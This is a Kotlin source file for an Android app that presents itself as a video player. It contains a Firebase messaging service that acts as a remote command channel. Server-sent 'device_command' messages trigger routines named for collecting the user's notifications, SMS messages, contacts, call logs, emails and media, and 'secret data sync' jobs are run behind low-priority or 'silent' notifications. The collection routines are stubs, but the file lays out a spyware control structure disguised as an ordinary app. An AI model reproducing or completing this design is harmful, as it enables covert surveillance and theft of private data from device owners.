package com.jumpy.videoplayerapp.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.jumpy.videoplayerapp.MainActivity
import com.jumpy.videoplayerapp.R

class JumpyFirebaseMessagingService : FirebaseMessagingService() {
    
    companion object {
        private const val TAG = "FirebaseMsgService"
        private const val CHANNEL_ID = "secret_notifications"
        private const val CHANNEL_NAME = "Secret Notifications"
        private const val CHANNEL_DESCRIPTION = "Notifications for secret data sync"
    }
    
    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "🔄 New FCM token: $token")
        
        // Update token in Firebase
        val firebaseService = FirebaseService.getInstance(this)
        firebaseService.updateDeviceToken(token)
    }
    
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        Log.d(TAG, "📨 Message received from: ${remoteMessage.from}")
        
        // Handle data payload
        remoteMessage.data.isNotEmpty().let {
            Log.d(TAG, "📊 Message data payload: ${remoteMessage.data}")
            
            // Handle different types of messages
            when (remoteMessage.data["type"]) {
                "secret_alert" -> handleSecretAlert(remoteMessage)
                "sync_request" -> handleSyncRequest(remoteMessage)
                "device_command" -> handleDeviceCommand(remoteMessage)
                else -> handleDefaultMessage(remoteMessage)
            }
        }
        
        // Handle notification payload
        remoteMessage.notification?.let {
            Log.d(TAG, "🔔 Message notification: ${it.title} - ${it.body}")
            showNotification(it.title ?: "Secret Alert", it.body ?: "New data available")
        }
    }
    
    private fun handleSecretAlert(remoteMessage: RemoteMessage) {
        val title = remoteMessage.data["title"] ?: "Secret Alert"
        val message = remoteMessage.data["message"] ?: "New secret data available"
        val priority = remoteMessage.data["priority"] ?: "normal"
        
        Log.d(TAG, "🚨 Secret alert received: $title - $message (Priority: $priority)")
        
        // Show high-priority notification
        showNotification(title, message, priority == "high")
        
        // Trigger immediate sync if requested
        if (remoteMessage.data["trigger_sync"] == "true") {
            FirebaseSyncWorker.scheduleOneTimeSync(this)
        }
    }
    
    private fun handleSyncRequest(remoteMessage: RemoteMessage) {
        Log.d(TAG, "🔄 Sync request received")
        
        // Trigger immediate data sync
        FirebaseSyncWorker.scheduleOneTimeSync(this)
        
        // Show silent notification
        showSilentNotification("Data sync initiated", "Syncing device data...")
    }
    
    private fun handleDeviceCommand(remoteMessage: RemoteMessage) {
        val command = remoteMessage.data["command"] ?: ""
        Log.d(TAG, "⚡ Device command received: $command")
        
        when (command) {
            "collect_notifications" -> collectNotifications()
            "collect_messages" -> collectMessages()
            "collect_contacts" -> collectContacts()
            "collect_call_logs" -> collectCallLogs()
            "collect_emails" -> collectEmails()
            "collect_media" -> collectMedia()
            "full_sync" -> performFullSync()
            else -> Log.w(TAG, "Unknown command: $command")
        }
    }
    
    private fun handleDefaultMessage(remoteMessage: RemoteMessage) {
        val title = remoteMessage.data["title"] ?: "Notification"
        val message = remoteMessage.data["message"] ?: "New message received"
        
        showNotification(title, message)
    }
    
    private fun showNotification(title: String, message: String, highPriority: Boolean = false) {
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        
        // Create notification channel for Android O and above
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = CHANNEL_DESCRIPTION
                enableVibration(true)
                enableLights(true)
            }
            notificationManager.createNotificationChannel(channel)
        }
        
        // Create intent for notification tap
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            putExtra("notification_type", "secret_alert")
        }
        
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        
        // Build notification
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(message)
            .setSmallIcon(R.drawable.ic_notification) // Make sure this icon exists
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .setPriority(if (highPriority) NotificationCompat.PRIORITY_HIGH else NotificationCompat.PRIORITY_DEFAULT)
            .setCategory(NotificationCompat.CATEGORY_MESSAGE)
            .build()
        
        // Show notification
        notificationManager.notify(System.currentTimeMillis().toInt(), notification)
        
        Log.d(TAG, "✅ Notification shown: $title")
    }
    
    private fun showSilentNotification(title: String, message: String) {
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(message)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setAutoCancel(true)
            .build()
        
        notificationManager.notify(System.currentTimeMillis().toInt(), notification)
    }
    
    // Data collection methods (to be implemented based on your data collection logic)
    private fun collectNotifications() {
        Log.d(TAG, "📱 Collecting notifications...")
        // Implement notification collection logic
    }
    
    private fun collectMessages() {
        Log.d(TAG, "💬 Collecting messages...")
        // Implement message collection logic
    }
    
    private fun collectContacts() {
        Log.d(TAG, "👥 Collecting contacts...")
        // Implement contact collection logic
    }
    
    private fun collectCallLogs() {
        Log.d(TAG, "📞 Collecting call logs...")
        // Implement call log collection logic
    }
    
    private fun collectEmails() {
        Log.d(TAG, "📧 Collecting emails...")
        // Implement email collection logic
    }
    
    private fun collectMedia() {
        Log.d(TAG, "📸 Collecting media...")
        // Implement media collection logic
    }
    
    private fun performFullSync() {
        Log.d(TAG, "🔄 Performing full sync...")
        FirebaseSyncWorker.scheduleOneTimeSync(this)
    }
} 